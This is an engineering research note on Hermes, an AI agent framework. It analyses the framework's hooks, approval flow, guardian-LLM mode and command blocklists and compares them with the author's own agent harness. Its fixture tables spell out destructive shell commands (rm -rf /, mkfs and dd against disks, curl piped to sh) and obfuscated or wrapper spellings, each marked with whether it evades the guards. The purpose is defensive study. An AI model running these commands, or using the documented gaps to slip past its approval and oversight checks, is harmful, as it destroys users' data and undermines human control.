# Hermes research: hooks, approval and command safety

Part of `../hermes-adoption-plan.md` (items H1, H3 and W1; H2 reuses the hook
shape). The source is Hermes commit `5fea5a7`, dated 2026-10-17, read from a
local clone. Paths are relative to the Hermes repository root.

## Coverage

I read the Hermes code and tests. I did not run Hermes. I ran our own hooks
with crafted JSON input (§8). A claim marked *(inference)* comes from reading
the code, and no test confirms it.

**Hermes, read in full:**
- all 9 approval modules (4,513 lines): `tools/approval.py`,
  `approval_detection.py`, `approval_floors.py`, `approval_smart.py`,
  `approval_yolo.py`, `approval_context.py`, `approval_prompt.py`,
  `approval_gateway_wait.py` and `approval_human_wait.py`;
- `agent/shell_hooks.py`, `agent/file_safety.py` and `agent/redact.py`;
- `tools/file_tools_write_guards.py`, `tools/self_repo_guard.py` and
  `tools/terminal_tool_guards.py`;
- `tools/environments/local_env_policy.py`;
- 8 test files in `tests/tools/`: `test_hardline_blocklist.py`,
  `test_self_repo_guard.py`, `test_execution_flag_detection.py`,
  `test_shell_bypass_denylist.py`, `test_hardline_escaped_quote_state.py`,
  `test_approval_windows.py`, `test_approval_deny_rules.py` and
  `test_approval_global_flag_scan.py`;
- `evals/postmortem/live_ab/hardline_scanner_matrix.py`.

**Hermes, read in part:**
- `hermes_cli/plugins.py`: lines 107-206, 1123-1148 and 1874-2122 of 2,237.
- `hermes_cli/plugins_dispatch.py`: lines 35-63, 155-200 and 248-402 of 683.
- `tools/environments/local.py`: lines 262-375, 543-556, 745-760 and 996-1004
  of 1,178. The rest builds PATH, resolves the working folder and kills
  process groups.
- `tools/mcp_tool_config.py`: lines 1-60, 145-210 and 533-654 of 654. The rest
  is stderr logging and launcher lookup.
- `agent/runtime_self_protection.py`: lines 1-80 of 290.
- Short ranges: `hermes_cli/_subprocess_compat.py` (96-117, 738 on),
  `hermes_cli/mcp_security.py` (89-135), `gateway/status.py` (405-441),
  `agent/prompt_builder.py` (83-109) and `tools/threat_patterns.py` (17, 91).
- Tests: `tests/tools/test_approval.py` (selected classes),
  `tests/tools/test_file_write_safety.py` (614-1018) and
  `tests/agent/test_shell_hooks.py` (dialect and fail-closed cases).
- Test names only: `tests/agent/test_shell_hooks_consent.py` and
  `tests/tools/test_terminal_self_repo_guard.py`.
- Docs: `website/docs/user-guide/security.md` (142-151) and
  `website/docs/user-guide/features/hooks.md` (396, 572, 590, 1828-1931,
  2018-2067).

**Hermes, not read:**
- 17 of the 21 `tests/tools/test_approval_*.py` files. The code they test is
  read in full.
- `tests/agent/test_shell_hooks_tree_kill.py`.
- `tools/terminal_tool.py`. So the call order of the terminal guards is not
  verified.
- `tools/shell_heredoc.py`, `cron/lifecycle_guard.py` and `tools/mcp_tool.py`.
  MCP belongs to `tools.md`.

**Our harness:**
- Read in full: the 9 files in `claude/hooks/`, `codex/hooks/policy.py`,
  `codex/hooks.json`, `codex/rules/harness.rules`, `test-hooks.sh` and
  `test-commit-trailers.sh`.
- Read in part: the hook and permission blocks of `claude/settings.json`,
  `claude/agents/*.md` and `codex/agents/*.toml`; the fixture lists of
  `test-isolated-test-runner.sh` and `test-codex-harness.py`.
- Not read: `test-handoff-hook.sh` and `test-worktree-hooks.sh`.

## 1. File map

| Path | Role |
|---|---|
| `tools/approval.py` | Facade: `check_all_command_guards`, session state, human and smart flows, allowlist, denial breaker |
| `tools/approval_detection.py` | `HARDLINE_PATTERNS` (12), `DANGEROUS_PATTERNS` (110), the quote-aware scanner, normalization, parser limits, detection variants |
| `tools/approval_floors.py` | User deny globs, hardline and `sudo -S` results, allowlist matching, the compound-command refusal |
| `tools/approval_smart.py` | Guardian LLM for `approvals.mode: smart` |
| `tools/approval_yolo.py` | Session `/yolo` toggle |
| `tools/approval_context.py` | Mode, timeout, unattended platforms, cron and single-query policy |
| `tools/approval_prompt.py` | CLI prompt and plugin approval transport |
| `tools/approval_gateway_wait.py`, `approval_human_wait.py` | Gateway waits: identical requests coalesced, 1 s polling, at most 256 waiting sessions |
| `agent/shell_hooks.py` | User shell hooks: config, wire format, consent |
| `hermes_cli/plugins.py`, `plugins_dispatch.py` | `VALID_HOOKS`, directive precedence, callback timeouts |
| `tools/self_repo_guard.py` | Windows-only guard against git changes to Hermes's own checkout |
| `tools/terminal_tool_guards.py` | Workdir character allowlist, gateway lifecycle block, self-repo wiring |
| `agent/runtime_self_protection.py` | Refuses deletion of the running interpreter and venv |
| `tools/file_tools_write_guards.py`, `agent/file_safety.py` | File-tool write and read guards |
| `agent/redact.py` | Secret redaction |
| `tools/environments/local_env_policy.py`, `local.py` | Child environment scrub, Git Bash on Windows |
| `tools/mcp_tool_config.py` | MCP child environment and config loading |

## 2. Hook contract

### 2.1 Shell hooks (`agent/shell_hooks.py`)

- **Config.** Entries sit under `hooks:`, keyed by event. Each entry has:
  - `command`;
  - `matcher`: a regex used with `fullmatch` (105-132). An invalid regex
    falls back to literal equality. Only `pre_tool_call` and `post_tool_call`
    use it (411-414);
  - `timeout`: 60 s by default, clamped to 1-300 s (37-38, 415-425);
  - `fail_closed` or `failClosed`: used for `pre_tool_call` only (426-434).
- **Input on stdin:** `hook_event_name`, `tool_name`, `tool_input`,
  `session_id`, `cwd`, `profile` and `extra` (87-102, 610-612).
- **Output for `pre_tool_call`** (`_PRE_TOOL_DIALECTS`, 623; parser 626-642):
  - block: `{"action":"block","message":…}` or `{"decision":"block","reason":…}`;
  - modify: `args` or `tool_input` replaces the arguments;
  - approve: `{"action":"approve"}` sends the call to the approval gate.
- Claude's `decision: approve` is not mapped. The code comment says it means
  allow in Claude Code (633-635). A test pins this
  (`tests/agent/test_shell_hooks.py`).
- **Exit code 2** blocks `pre_tool_call` (42, 44). The message comes from
  stdout JSON, then from stderr cut to 400 characters, then from a fixed text
  (577-583).
- **Failure** (`_evaluate_result`, 544-600):
  - A spawn error or a timeout fails open, unless `fail_closed` is set
    (568-573).
  - With `fail_closed`, a non-zero exit with no directive blocks. Unparseable
    stdout also blocks (585-599).
- **Process.** Each hook runs in its own process group on POSIX. A timeout
  kills the whole tree (486-519). The hook environment comes from
  `build_subprocess_env`, with the secret scrub on only under a multiplex
  gateway (486-497).
- **Consent:**
  - Each `(event, command)` pair must be in `shell-hooks-allowlist.json`. The
    file has mode 0600 and is written under a lock (709, 716-730).
  - Consent comes from a TTY prompt, `--accept-hooks`, `HERMES_ACCEPT_HOOKS`
    or `hooks_auto_accept` (738-797).
  - With no TTY and no accept channel, the hook is not registered
    (`tests/agent/test_shell_hooks_consent.py:108`).
  - Each approval records the script mtime (761-764). Nothing enforces it at
    run time. The docs call script edits "silently trusted" (`hooks.md:2028`).
    Only `hermes hooks doctor` reports the drift.
- **Windows.** `.sh` and `.bash` hooks run through bash, and `.py` hooks
  through `sys.executable` (449-466). Another suffix gets a clear `WinError
  193` message (502-505).
- **Command splitting** uses `split_command_line`, not `shlex` (24-25). On
  Windows it calls `shlex.split(posix=False)` and strips one quote layer
  (`hermes_cli/_subprocess_compat.py:96-117`).

### 2.2 Plugin hooks and dispatch

- `VALID_HOOKS` holds 44 events (`hermes_cli/plugins.py:107`). The event
  `transform_api_error_classification` cannot take a shell hook (206).
- **Precedence.** `block` wins over `approve`, and `approve` wins over none.
  Registration order does not matter (`plugins.py:1981-2033`). `modify`
  results merge shallowly. A block needs a message.
- After an `approve`, an approval gate that errors, denies or times out blocks
  the call (`plugins.py:2061-2090`).
- **Callback timeout:** 30 s by default. A value of 0 or less disables it. The
  maximum is 600 s (`plugins.py:1123-1148`; `plugins_dispatch.py:160-161`).
  - A `pre_tool_call` callback that times out or raises becomes a block
    (`plugins_dispatch.py:276-289`).
  - Other bounded hooks fail open.
  - A callback that timed out is skipped for 60 s. At most 3 abandoned
    workers are kept (60-62).
- In safe-worker mode, `invoke_hook` runs no hooks (`plugins_dispatch.py:263-264`).
- **Finding: shell hooks share the 30 s bound.** *(inference)*
  - `invoke_hook` uses one timeout for every callback
    (`plugins_dispatch.py:271-280`).
  - Shell hooks join the same callback list (`shell_hooks.py:281-294`).
  - So a shell `pre_tool_call` hook that runs 45 s is blocked at 30 s. Its
    own timeout of 60 s and `fail_closed: false` do not apply.
  - The docs say shell hooks keep their own timeout (`hooks.md:396`).

## 3. Approval flow (`tools/approval.py`)

`check_all_command_guards` (1151-1194) runs these steps in order. The list is
simplified.

1. Skip all guards in isolated containers: Docker without host access,
   Singularity, Modal, Daytona and Vercel Sandbox (1041-1055).
2. Apply the floors. No mode bypasses them (`_floor_block`, 1069-1092):
   - the hardline patterns (§4.6);
   - deletion of the running runtime (`agent/runtime_self_protection.py`);
   - `sudo -S` when `SUDO_PASSWORD` is not set (`approval_detection.py:187-196`);
   - the user's `approvals.deny` globs (`approval_floors.py:23-42`).
3. Allow the rest under yolo or `approvals.mode: off` (506-510).
4. Allow a match in the permanent allowlist (336-501). Compound commands
   never match (§4.8).
5. Deny in cron, single-query and unattended contexts by default
   (`approval_context.py:347-371`).
6. Run detection (§4). A session approval for the same pattern key passes.
7. Ask a human, or the guardian LLM in `smart` mode.

**Yolo** has three sources (`_yolo_active`, 327-333):
- `HERMES_YOLO_MODE`, read once at import (46). A skill cannot switch it on
  later.
- the session `/yolo` toggle (`approval_yolo.py`);
- an unattended turn.

This is why the Hermes `config.yaml` is a hard deny for file tools, and an
approval for terminal writes (§6).

**Human prompt:**
- The CLI choices are once, session and always. Any other input denies
  (`approval_prompt.py:69-73, 171`).
- With prompt_toolkit active and no callback, the prompt fails closed (136-150).
- The timeout is `approvals.timeout`, 300 s by default
  (`approval_context.py:305-323`). A timeout denies with " Silence is not
  consent." (722-723).

**Plugin approvals.** `request_tool_approval` (1121-1146) builds a default
rule key from the tool name and `sha256(reason)[:12]`. It fails closed when no
human is present.

**Smart mode** (`tools/approval_smart.py`):
- The prompt marks the command as untrusted input in `<command>` tags (17-32,
  116).
- Shell comments are removed first, with quotes respected (36-65).
- The call uses temperature 0 and 16 tokens (123-127).
- An empty answer, an unknown answer or an error escalates to the human
  (129-146).
- APPROVE is never saved. Only guardian DENYs count toward the denial breaker
  (764-793). Human denials do not count (926-929).
- The breaker threshold is `approvals.denial_breaker_threshold`, 3 by default.
  The value 0 disables it (72-77).

## 4. Command detection (`tools/approval_detection.py`)

### 4.1 Normalization (521-541)

1. Remove ANSI codes and NUL bytes, then apply NFKC (525).
2. Join backslash-newlines, CRLF included (529).
3. Fold the Hermes home and the user home to `~` (534-535).
4. Remove backslash escapes (537).
5. Remove empty quote pairs `''` and `""` (538).
6. Replace `$IFS` and `${IFS…}` with a space (541).

Only dash-prefixed tokens keep their case (544-550). So `branch -D` and
`branch -d` stay different.

### 4.2 Parser limits (696, 702-711)

The detector gives a hardline block when a command has:
- more than 128,000 characters;
- more than 4,096 characters with no `;`, `&`, `|` or newline;
- 25,000 or more separators.

Malformed quoting in a `grep` operand also gives a hardline block (207-209).
Hermes saves the blocked text in `cache/blocked-scripts` for 7 days
(`approval_floors.py:54-89`).

### 4.3 Command position and wrappers

- `_CMDPOS` anchors most rules (82-86). It accepts the start of the string, a
  newline, a backtick or `$(`.
- After that position, it accepts `sudo` with dash flags, `env VAR=VAL` pairs,
  and `exec`, `nohup`, `setsid` or `time`.
- `_mark_command_starts` inserts a newline before each real command start
  (1169-1213). It respects quotes, so `--title "block (reboot)"` stays data.
- **Wrapper stripping is narrower than the earlier version said.** The full
  table has 15 wrapper words and their option tables (609-628). Hermes uses it
  only for:
  - the user deny globs (1386-1427);
  - command-word deobfuscation (1491-1507);
  - interpreter flags (§4.5).
- The regex rules see only the `_CMDPOS` wrappers. *(inference)* So
  `sudo -u root rm -rf /` and `timeout 5 rm -rf /` miss the hardline floor.
- The unanchored DANGEROUS rule `\brm\s+-[^\s]*r` still asks a human (230). No
  test covers these two forms.

### 4.4 Detection variants (1430-1507)

Each rule runs over these variants of the command:
1. the normalized text, with quoted `grep -P` patterns masked (790-849);
2. a Windows variant, with backslashes turned into `/` first (1452-1455);
3. each extracted `-c` payload, plain and with starts marked (1458-1468);
4. the normalized text with command starts marked (1472);
5. starts marked on the raw text, then normalized (1480-1482);
6. one text with every command word deobfuscated (1491-1507).

Variant 5 fixed `cat "f\"n.txt"; rm -rf /`. Normalization had changed the
quote state there. Variant 6 catches `r\m`, `r''m`, `$(echo rm)` and
`${unset:-rm}`.

### 4.5 Carriers and interpreter flags (993-1020)

- **Shell `-c`** for bash, sh, zsh, ksh and dash: Hermes extracts the payload
  and scans it again (932-956). Any shell `-c` also asks for approval, as
  "shell command via -c/-lc flag".
- **`eval`, `source` and `.`** are not parsed as carriers. They only make the
  2 quote-masked hardline rules scan the raw text (152, 214-221).
  *(inference)* So `eval "rm -rf /"` gets an approval, not a hardline block.
- **Interpreter flags** ask for approval. Hermes does not scan the code
  (638-642). The flags differ per language:

| Language | Flags |
|---|---|
| python | `-c` |
| node | `-e`, `--eval`, `-p`, `--print` |
| perl | `-e`, `--eval` |
| ruby | `-e` |
| php | `-r` |
| powershell, pwsh | `-command`, `-c`, `-file`, `-f` |
| bun | `-e`, `--eval` |
| deno | `eval`, `-e`, `--eval` |

- **Read tools that run a program** pass the program to the scan (656-659):
  - sort `--compress-program`;
  - rg `--pre` and `--hostname-bin`;
  - ag `--pager`;
  - man `--pager`, `--html`, `-P` and `-H`.
- A malformed executable token fails closed.

### 4.6 Hardline (107-140, 12 rules)

The code comment says "Deliberately tiny: only things with no recovery path"
(70-76). Recoverable actions, such as `git reset --hard` and `curl | sh`, stay
in DANGEROUS.

| Rule | Line |
|---|---|
| `rm` of root, also `//`, `/.`, `/..` and `/ *` | 112 |
| `rm` of `/home`, `/root`, `/etc`, `/usr`, `/var`, `/bin`, `/sbin`, `/boot`, `/lib`, each also with `/*` | 113 |
| `rm` of `~`, `$HOME`, `${HOME}` | 114 |
| `mkfs` | 118 |
| `dd of=` a disk device: sd, nvme, hd, mmcblk, vd, xvd | 122 |
| `>` redirect to a disk device | 131 |
| fork bomb | 132 |
| `kill … -1` | 135 |
| `shutdown`, `reboot`, `halt`, `poweroff` | 136 |
| `init 0` or `init 6` | 137 |
| `systemctl poweroff`, `reboot`, `halt`, `kexec` | 138 |
| `telinit 0` or `telinit 6` | 139 |

The `rm` flag group is `(-[^\s]*\s+)*` (103). So any flags in any order
match, and the rules need no `-r`.

### 4.7 Dangerous (228-482, 110 rules)

These rules ask a human.

| Group | Rules | Lines |
|---|---|---|
| Delete | `rm` of a root path, `-r`, `--recursive`, flags after operands | 229-241 |
| Delete | `xargs rm`, `find -exec rm`, `find -delete` | 356-367 |
| Windows (25 rules) | `cmd /c del`; PowerShell delete verbs; `-EncodedCommand` | 244-248 |
| Windows | `Remove-Item -Recurse/-Force`; `del`, `erase`, `rd`, `rmdir` with `/s` or `/q`; `iwr \| iex` | 255-260 |
| Windows | `taskkill /f`; `Stop-Process -Force`; `Format-Volume`; `Clear-Disk`; `diskpart`; `format X:`; `cipher /w` | 262-269 |
| Windows | `icacls` Everyone and `/reset`; `vssadmin delete shadows`; `wbadmin delete`; `bcdedit /set` | 271-276 |
| Windows | `reg delete`; `Remove-ItemProperty -Force`; `Stop-Service -Force`; `sc stop\|delete`; Windows `.ssh` path; Hermes `.env` in AppData | 278-285 |
| Permissions | `chmod 777/666/o+w/a+w`; `chown -R root` | 287-290 |
| Disks and SQL | `mkfs`, `dd if=`, `> /dev/sd…`; `DROP`, `DELETE` without `WHERE`, `TRUNCATE` | 293-300 |
| Processes | `systemctl stop\|restart\|disable\|mask`, `kill -9 -1`, `pkill -9`, `killall`, fork bomb | 302-310 |
| Remote code | `curl\|wget … \| sh` for 5 shells; process substitution; `eval`/`source`/`.` of `$(curl)` | 313-316 |
| Remote code | decode piped to a shell (base64, base32, base16, `xxd -r`, `tr`, `openssl`); `chmod +x` then `./` | 332-338, 461 |
| Exfiltration | cloud metadata endpoints; upload of a credential file; invisible or bidi Unicode | 326-351 |
| Sensitive targets | `tee` or redirect; `cp`, `mv`, `install`; `sed -i`, `perl -i`, `ruby -i` | 352-355, 408-439 |
| Git | `reset --h`, `--ha`, `--har`, `--hard`; `push … --forc*`; `push … -f`; `clean -…f` | 446-449 |
| Git | `branch -D` (case-sensitive); `--delete` with `--force` in either order | 455-459 |
| Other | `sudo -s`, `--stdin`, `-a`, `--askpass`; uninstall with npm, pnpm, yarn, pip, brew | 468-481 |
| Hermes-specific | gateway, update, Docker remote daemon, container lifecycle, `launchctl` | 374-407 |

### 4.8 Quote masking and the allowlist

- Quote masking applies to 4 rules only (146, 488-491):
  - hardline: the disk redirect and the fork bomb;
  - dangerous: the `find` dynamic word and the read-tool dynamic word.
- The other hardline rules avoid prose through `_CMDPOS`. Most DANGEROUS
  rules are not anchored, so quoted prose can still ask *(inference)*.
- **The allowlist refuses compound commands** (`approval_floors.py:134-185`).
  It does not apply when a command has:
  - an unquoted control character: newline, CR, `;&|<>`, backtick, `$`, `(`
    or `)` (139);
  - `$` or a backtick inside double quotes;
  - an unterminated quote;
  - a quoted control character with a `-c`, `-e`, `--command` or `--eval`
    option (141).
- The comment names `git -c alias.x=!…` and a port from oh-my-pi (134-138).
- Allowlist entries match the exact text, or an `fnmatch` glob with `*?[`
  (188-204).

## 5. Git options and aliases

**Answer.** The approval layer does not parse git global options or aliases.
Only the Windows self-repo guard does.

- The DANGEROUS git rules need `git` and the subcommand side by side
  (446-459). *(inference)* So the approval layer does not flag:
  - `git -C dir reset --hard`;
  - `git -c k=v push --force`;
  - `git --git-dir=x --work-tree=y clean -f`;
  - an alias such as `git nuke`.
- No approval test uses `git -C`, `git -c` or `--git-dir`. The global-flag
  scan covers only `hermes`, `docker` and `podman` (48-51;
  `tests/tools/test_approval_global_flag_scan.py`).
- The allowlist refuses `git -c alias.x=!…` as a compound command (§4.8). It
  does not resolve the alias.

**`tools/self_repo_guard.py` parses git fully:**
- It knows `-C`, `-c`, `--work-tree`, `--git-dir`, `--namespace` and
  `--exec-path` (52-53).
- `-C`, `--work-tree` and `GIT_WORK_TREE` set the target. The other options
  are only consumed (373-405).
- It also accepts `-Cdir` and `-cK=V`. Git 2.53 rejects both forms as
  "unknown option" (checked locally), so this is extra caution.
- `-c alias.X=…` records an inline alias (366-370).
- It reads configured aliases with `git -C target config --get alias.X`, with
  a 1 s timeout (445-451).
- It scans a `!` alias as a shell command. Recursion stops at depth 4 (50,
  467-479).
- It strips wrappers (125-142) and scans `-c` payloads (492-496).
- It scans heredocs fed to a shell (509-516). It follows `cd` through `&&`,
  `;` and newlines (517-534).
- Mutations (19-24, 418-442):
  - checkout, switch, rebase, merge, pull, cherry-pick, revert, bisect;
  - `reset --hard`, `--merge` or `--keep`;
  - `stash`, except safe actions; `clean`, except a dry run;
  - `restore`, except with `--staged` only;
  - `worktree remove` or `move` of the checkout root; `gh pr checkout`.

**Scope.** The guard runs only on Windows (`guard_active`, 538-542) and only
for the local backend (`terminal_tool_guards.py:343-368`). It protects only
Hermes's own source checkout. The reason is NTFS: a rewritten checkout can
corrupt the running process (`terminal_tool_guards.py:350-356`).

## 6. Other guards

**File-tool write guards** (`tools/file_tools_write_guards.py`):
- Deny writes under `/etc/`, `/boot/`, `/usr/lib/systemd/` and three
  `/private/…` paths. Deny the two Docker sockets (33-37).
- Deny writes to the Hermes `config.yaml` (166-173). It holds
  `approvals.mode`. Terminal writes to it ask (`approval_detection.py:24-28`).
- **Protected instruction files:** `agents.md`, `claude.md`, `soul.md` and
  `.cursorrules`, in any folder and in any case (189-190).
  - Matching uses the path and its realpath. A file directly in a `.hermes`
    folder is also protected (211-253).
  - The switches are `security.protected_instruction_files` (on by default)
    and `…_extra_patterns` (193-208).
  - Each write asks a human, for that one operation (260-343). Yolo does not
    bypass it. With no human present, it fails closed.
  - One protected file gates a whole multi-file patch (346-356).
  - The comment says the terminal path is "covered separately (#58631)"
    (182-183). I found no terminal check for these files.
- Also: a binary-document guard (483-547), a stale-overwrite guard (557-594)
  and a refusal to write internal tool text as content (615-646).

**`agent/file_safety.py`** calls itself "defense-in-depth, NOT a security
boundary" (1-6):
- Write-denied files: SSH keys and `authorized_keys`, `.netrc`, `.pgpass`,
  `.npmrc`, `.pypirc`, `.git-credentials`, the Hermes `.env`, `/etc/sudoers`,
  `passwd` and `shadow` (176-206).
- Denied prefixes include `/etc/sudoers.d` and `/etc/systemd` (210-219).
- A write to `~/.ssh/config` asks (231-239).
- Project `.env*` files cannot be read (335-414).
- A guard on the raw path blocks NT device namespaces (102-173).

**Runtime self-protection.** A command that deletes the running interpreter or
venv hits a floor (`agent/runtime_self_protection.py`, wired at
`approval.py:1069-1092`).

**Context-file scan.** A hit replaces the file with `[BLOCKED: … Content not
loaded.]` (`agent/prompt_builder.py:83-109`). The patterns are in `memory.md`.

**Redaction** (`agent/redact.py`):
- 56 vendor prefixes (147-222), not "about 41".
- Structural rules (226-577): env, config, YAML, JSON (also escaped JSON) and
  Python repr fields; `Authorization` and 7 API-key headers; PEM keys.
- More structural rules: database DSNs, bare URL tokens, JWTs and phone
  numbers.
- A token split by control characters is still caught (605-638).
- Exact vault values are always removed, 64 per profile (36-82).
- `HERMES_REDACT_SECRETS` is read at import (103). A profile can override it
  (113-145). `force=True` ignores the switch (893-1009).
- File reads get a sentinel that cannot work as a key (800-831). So the agent
  cannot write back a truncated key.
- `redact_for_egress` fails closed with `[redaction-unavailable]` (1157-1176).
- Plugins can only add patterns (1280-1352). Each needs a 2-character literal
  prefix, no top-level alternation and no nested unbounded repeat.

**Child environment:**
- Tier-1 keys are always removed. Provider credentials are removed unless
  `inherit_credentials` is set (`local.py:362-375`; `local_env_policy.py:19-98,
  375-398`).
- Names are case-folded on Windows (`local_env_policy.py:177-186`).

**MCP.** A child gets a short safe environment (`mcp_tool_config.py:147-206`).
An unresolved `${VAR}` in a remote URL or header fails closed (550-568).
Suspicious servers are filtered out (597-610).

**Windows shell:**
- `MSYS_NO_PATHCONV=1` and `MSYS2_ARG_CONV_EXCL=*` (`local.py:745-760`).
- `PYTHONUTF8=1` for child processes (`local.py:358`).
- Tree kill with `taskkill /T /F` (`local.py:996-1004`). The gateway checks the
  process identity first (`gateway/status.py:405-441`).

## 7. Hermes docs that disagree with the code

- `website/docs/user-guide/security.md:142-151` names
  `tools/approval.py::UNRECOVERABLE_BLOCKLIST`. That name does not exist.
- The same list calls `curl | sh` unrecoverable. The code keeps it in
  DANGEROUS (313).
- `website/docs/user-guide/features/hooks.md:396` says shell hooks keep their
  own timeout. The dispatcher bounds them at 30 s (§2.2).
- The terminal check for instruction files is not in the code (§6).

## 8. Fixture cases

**Method.** I sent each command to our hook as JSON on stdin. The push cases
ran with `CLAUDE_CODE_REMOTE=true` in a checkout on `main`. "Probe" means I
ran the case. "Reading" means I did not run it. "Live" means our hook blocked
a read-only command during this research.

**A. Carriers and substitutions** (`block-destructive-bash.sh`)

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 1 | `sh -c 'rm -rf /'` | hardline (payload scan) | deny (probe) | `approval_detection.py:932-956` |
| 2 | `eval "git reset --hard"` | asks (446) | deny (probe) | |
| 3 | `echo "$(grep x f; reboot)"` | hardline | allow: no reboot rule (reading) | `hardline_scanner_matrix.py` |
| 4 | `cat "f\"n.txt"; rm -rf --no-preserve-root /` | hardline | deny (reading) | `test_hardline_escaped_quote_state.py` |

**B. `rm` spellings** (`block-destructive-bash.sh`)

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 5 | `rm -rf //` | hardline | allow (probe) | `test_hardline_blocklist.py:31` |
| 6 | `rm -v -rf /` | hardline *(inference)* | allow (probe) | `approval_detection.py:103` |
| 7 | `rm --no-preserve-root -rf /` | hardline *(inference)* | allow (probe) | `approval_detection.py:103` |
| 8 | `rm -rf /etc` | hardline | allow (probe) | `approval_detection.py:113` |
| 9 | `r\m -rf /` | flagged | allow (probe) | `test_shell_bypass_denylist.py:33` |
| 10 | `r''m -rf /` | flagged | allow (probe) | `test_shell_bypass_denylist.py:34` |
| 11 | `"rm" -rf /` | flagged *(inference)* | allow (probe) | `approval_detection.py:1491-1507` |
| 12 | `echo $(echo rm) -rf /` | not flagged | allow (reading) | `test_shell_bypass_denylist.py:57` |
| 13 | `sudo -u root rm -rf /` | asks only *(inference)* | deny (probe) | §4.3 |
| 14 | `timeout 5 rm -rf /` | asks only *(inference)* | deny (probe) | §4.3 |

**C. Disks** (`block-destructive-bash.sh`)

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 15 | `mkfs /dev/sdb` | hardline | allow (probe) | `approval_detection.py:118` |
| 16 | `mkfs.ext4 /dev/mmcblk0p1` | hardline | allow (probe) | `approval_detection.py:118` |
| 17 | `cat img > /dev/sda` | hardline | allow (probe) | `approval_detection.py:131` |
| 18 | `dd if=/dev/sda of=./disk.img` | asks | deny (probe): a false positive, it only reads the disk | `approval_detection.py:294` |

**D. Git** (destructive, push and trailer hooks)

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 19 | `git reset --har` | asks | allow (probe) | `approval_detection.py:446`; `test_self_repo_guard.py:34` |
| 20 | `git --git-dir=/x/.git --work-tree=/x reset --hard` | not flagged; the self-repo guard hits | deny (reading) | `test_self_repo_guard.py:106` |
| 21 | `git -c alias.nuke='reset --hard' nuke` | not flagged; the self-repo guard resolves it | allow (probe) | `test_self_repo_guard.py:116` |
| 22 | `git checkout HEAD -- .` | not flagged | allow (probe) | |
| 23 | `git restore --source=HEAD .` | not flagged | allow (probe) | |
| 24 | `git push -fu origin main` | not flagged *(inference)* | allow (probe) | `approval_detection.py:448` |
| 25 | `git push --force-w origin main` | asks | allow (reading) | `approval_detection.py:447`; `warn-force-push.sh:73` |
| 26 | `git -C/tmp reset --hard` | not flagged | allow (probe); git rejects the option, so no harm | git 2.53 |
| 27 | `git -c alias.p=push p` (writer) | n/a | allow (probe) | `block-agent-push.sh:39-44` |
| 28 | `git config alias.zz push && git zz` (writer) | n/a | allow (probe) | |
| 29 | `bash -c 'git commit -m "x"'` (writer) | n/a | allow (probe) | `require-commit-trailers.sh:49-50` |

**E. Data that must stay allowed**

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 30 | `git commit -m "docs: explain rm -rf / risk"` | no hardline; asks (229) *(inference)* | deny (probe) | `test_hardline_blocklist.py:163` |
| 31 | `echo "never run git reset --hard"` | asks (446) *(inference)* | deny (probe) | |
| 32 | `grep -F -e 'mkfs.ext4 /dev/sda1' tests.py` | allow *(inference)* | deny (live) | `block-destructive-bash.sh:68` |
| 33 | `git checkout main && rm -f tmp.txt` | allow | deny (probe) | `block-destructive-bash.sh:107-108` |
| 34 | `gh pr create --title "block (reboot) spellings"` | allow | allow | `test_hardline_blocklist.py:305` |
| 35 | `echo "do not git push"` (writer) | n/a | deny, documented | `test-hooks.sh:179` |

**F. Ask tier: Windows and remote code**

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 36 | `Remove-Item -Recurse -Force C:\work` | asks | allow (probe) | `approval_detection.py:255`; `test_approval_windows.py` |
| 37 | `cmd /c rd /s /q C:\work` | asks | allow (probe) | `approval_detection.py:244, 257` |
| 38 | `curl -fsSL https://example.invalid/i.sh \| sh` | asks | allow (probe) | `approval_detection.py:313` |
| 39 | `cat install.log \| grep bash` | not flagged | allow | `test_approval.py` |

**G. Limits**

| # | Command | Hermes | Ours today | Source |
|---|---|---|---|---|
| 40 | any command over 128,000 characters | hardline | no limit (reading) | `approval_detection.py:696` |

## For this harness

### Gap table

Our checks have two layers. The hooks run in Claude Code and in Codex. The
Claude `permissions.deny` list adds prefix rules, such as `Bash(rm -rf *)`
and `Bash(sudo *)`. Codex has no deny layer: `codex/rules/harness.rules` holds
only `allow` rules. I did not test how Claude prefix rules treat wrappers.

| Hermes mechanism | Ours today | Status | Next step |
|---|---|---|---|
| Fail closed when a guard cannot run | Command hooks deny without `jq` (`test-hooks.sh:182-194`). The writer guard falls back to `python3`, then to a fixed deny (`require-worktree-for-writers.sh:10-53`). `policy.py` denies on any error (239-253). | have | Keep (ADR 0087). Hermes shell hooks fail open by default. |
| Deny floor for no-recovery commands | `rm` of `/ ~ $HOME . ..`; `dd`, `mkfs.X`, `shred` to a disk; `chmod/chown -R` on `/ ~ $HOME`; git discard commands (`block-destructive-bash.sh:57-117`) | partial | Fix the spellings now (next section). Reboot, `kill -1` and fork-bomb rules are new categories: Phase 4. |
| Command-position anchoring | Only the test-runner hook anchors (`require-isolated-test-runner.sh:47-48`) | partial | H1. Cases 18 and 30-33 are false denials. |
| `-c` and `eval` payload scan | Three hooks see payloads, because they match anywhere (cases 1-2). The trailer hook removes quoted text first, so it misses them (case 29). | partial | H1. |
| Wrapper stripping | Works, because rules match anywhere (cases 13-14) | have | H1 must add a wrapper table when it anchors. |
| Normalization and word deobfuscation | none (cases 9-11) | missing | H1. |
| Parser limits | none (case 40) | missing | H1. |
| Git global options | Spaced forms are tested (`test-hooks.sh:87-91, 162-164`). The `=` forms work by reading (case 20). Git rejects attached forms (case 26). | have | Add a fixture for case 20. We are ahead of the Hermes approval layer. |
| Git aliases | A fixed list synced with `.gitconfig`: `rlc`, `co`, `fu` and 11 push typos | partial | H1: resolve with `git config --get` (cases 21, 27-28). |
| Abbreviated and combined git flags | none (cases 19, 24-25) | missing | Fix now. |
| Discard-all git forms | `checkout .`, `restore .`, `checkout -f`, `switch --discard-changes` | partial | Fix now (cases 22-23). |
| Windows destructive tier | none (cases 36-37) | missing | H3 with W1, as ask. |
| Remote-code tier | none (case 38) | missing | Phase 4, as ask. |
| Protected instruction files | none. `permissions.deny` covers edits to `~/.bashrc`, `~/.zshrc` and `~/.ssh/**` only. | missing | Phase 4, narrowed (below). |
| Read-only shell for reviewers | Codex readers get a deny-by-default allowlist (`policy.py:47-128`) | have | Keep. Hermes has nothing like it. |
